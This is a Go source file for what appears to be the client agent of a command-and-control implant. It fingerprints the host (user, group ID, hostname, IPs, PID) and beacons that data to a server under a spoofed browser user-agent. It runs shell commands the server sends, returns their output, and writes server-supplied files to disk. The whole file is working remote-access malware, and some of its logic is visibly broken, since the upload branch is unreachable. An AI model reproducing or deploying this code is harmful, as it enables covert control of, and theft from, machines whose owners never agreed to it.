package node

import (
	"bytes"
	"crypto/sha1"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"messages"
	"net"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	uuid "github.com/satori/go.uuid"
)

type node struct {
	ID           uuid.UUID
	Platform     string
	Architecture string
	UserName     string
	UserGUID     string
	HostName     string
	Ips          []string
	Pid          int
	Log          *os.File
	UserAgent    string
	Client       *http.Client
	FirstTime    time.Time
	MostRecent   time.Time
	WaitTime     time.Duration
	FailureCount int
	MaxRetry     int
	initial      bool
}

func main() {
	fmt.Println("here")
}

func New() node {
	u, err := uuid.NewV4()
	if err != nil {
		log.Panic(err)
	}
	n := node{
		ID:           u,
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
		initial:      false,
		Client:       &http.Client{},
		WaitTime:     30000 * time.Millisecond,
		MaxRetry:     7,
	}

	user, err := user.Current()
	if err != nil {
		log.Println(err)
	} else {
		n.UserName = user.Username
		n.UserGUID = user.Gid
	}

	h, err := os.Hostname()
	if err != nil {
		log.Println(err)
	} else {
		n.HostName = h
	}

	interfaces, err := net.Interfaces()
	if err != nil {
		log.Println(err)
	} else {
		for _, iface := range interfaces {
			addrs, err := iface.Addrs()
			if err == nil {
				for _, addr := range addrs {
					n.Ips = append(n.Ips, addr.String())
				}
			}
		}
	}
	return n
}

func (n *node) Run(server string) {

	for {
		if n.initial {
			go n.checkIn(server)
		} else {
			n.initial = n.firstRun(server)
		}
		if n.FailureCount >= n.MaxRetry {
			os.Exit(1)
		}

		time.Sleep(n.WaitTime)
	}
}

func (n *node) firstRun(host string) bool {
	s := messages.SysInfo{
		Platform:     n.Platform,
		Architecture: n.Architecture,
		UserName:     n.UserName,
		UserGUID:     n.UserGUID,
		HostName:     n.HostName,
		Pid:          n.Pid,
		Ips:          n.Ips,
		WaitTime:     n.WaitTime.String(),
		MaxRetry:     n.MaxRetry,
	}
	sysInfoPayload, err := json.Marshal(s)
	if err != nil {
		log.Println(err)
	}

	msg := messages.Base{
		ID:      n.ID,
		Type:    "first",
		Payload: (*json.RawMessage)(&sysInfoPayload),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(msg)

	req, err := http.NewRequest("POST", host, b)
	if err != nil {
		log.Panicln(err)
	}
	req.Header.Set("User-Agent", n.UserAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := n.Client.Do(req)

	if err != nil {
		n.FailureCount++
		return false
	}

	if resp.StatusCode != 200 {
		n.FailureCount++
		return false
	}
	n.FailureCount = 0
	return true
}

func (n *node) checkIn(host string) {
	fmt.Println("Checking in!")
	msg := messages.Base{
		ID:   n.ID,
		Type: "status",
	}
	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(msg)

	req, err := http.NewRequest("POST", host, b)

	if err != nil {
		log.Println(err)
	}
	req.Header.Set("User-Agent", n.UserAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	resp, err := n.Client.Do(req)

	if err != nil {
		n.FailureCount++
		log.Println(err)
		return
	}
	if resp.StatusCode != 200 {
		n.FailureCount++
		return
	}

	n.FailureCount = 0
	if resp.ContentLength != 0 {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}

		json.NewDecoder(resp.Body).Decode(&j)

		n.continueCheckIn(j, payload, host)
	}
}

func (n *node) continueCheckIn(j messages.Base, payload json.RawMessage, host string) {
	var b messages.Base
	var c messages.CmdResults

	switch j.Type {
	case "FileTransfer":
		var p messages.FileTransfer
		json.Unmarshal(payload, &p)

		if p.IsDownload {
			c = messages.CmdResults{
				Job:    p.Job,
				Stdout: "",
				Stderr: "",
			}
			d, _ := filepath.Split(p.FileLocation)
			_, err := os.Stat(d)
			if err != nil {
				c.Stderr = fmt.Sprintf("There was an error getting info, dir: %s:\r\n", p.FileLocation)
				c.Stderr += fmt.Sprintf(err.Error())
			}
			if c.Stderr == "" {
				downloadFile, err := base64.StdEncoding.DecodeString(p.FileBlob)
				if err != nil {
					c.Stderr = err.Error()
				} else {
					err = ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
					if err != nil {
						c.Stderr = err.Error()
					} else {
						c.Stdout = fmt.Sprintf("Done uploading to %s on node %s", p.FileLocation, n.ID.String())
					}
				}
			}
			k, _ := json.Marshal(c)
			b = prepareCmdResults(j.ID, k)

			if !p.IsDownload {
				fileData, err := ioutil.ReadFile(p.FileLocation)
				if err != nil {
					msg := fmt.Sprintf("There was an error reading %s\r\n", p.FileLocation)
					msg += err.Error()
					c := messages.CmdResults{
						Job:    p.Job,
						Stderr: msg,
					}

					k, _ := json.Marshal(c)
					b = prepareCmdResults(j.ID, k)
				} else {
					fileHash := sha1.New()
					io.WriteString(fileHash, string(fileData))

					f := messages.FileTransfer{
						FileLocation: p.FileLocation,
						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
						IsDownload:   true,
						Job:          p.Job,
					}
					k, _ := json.Marshal(f)
					b = prepareCmdResults(j.ID, k)
				}
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(b)
			resp2, err := n.Client.Post(host, "application/json; charset=utf-8", b2)
			if err != nil {
				log.Panic(err)
			}
			if resp2.StatusCode != 200 {
				log.Println("Error", resp2.StatusCode)
			}
		}

	case "CmdPayload":
		var p messages.CmdPayload
		json.Unmarshal(payload, &p)
		stdout, stderr := n.executeCommand(p)

		c = messages.CmdResults{
			Job:    p.Job,
			Stdout: stdout,
			Stderr: stderr,
		}

		k, _ := json.Marshal(c)
		b = prepareCmdResults(j.ID, k)

		b2 := new(bytes.Buffer)
		json.NewEncoder(b2).Encode(b)
		resp2, _ := n.Client.Post(host, "application/json; char-set=utf-8", b2)
		if resp2.StatusCode != 200 {
			log.Println("Error: ", resp2.StatusCode)
		}
	}
}

func prepareCmdResults(id uuid.UUID, payload json.RawMessage) messages.Base {
	return messages.Base{
		ID:      id,
		Type:    "CmdResults",
		Payload: (*json.RawMessage)(&payload),
	}
}

func (n *node) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	return ExecuteCommand(j.Command, j.Args)
}
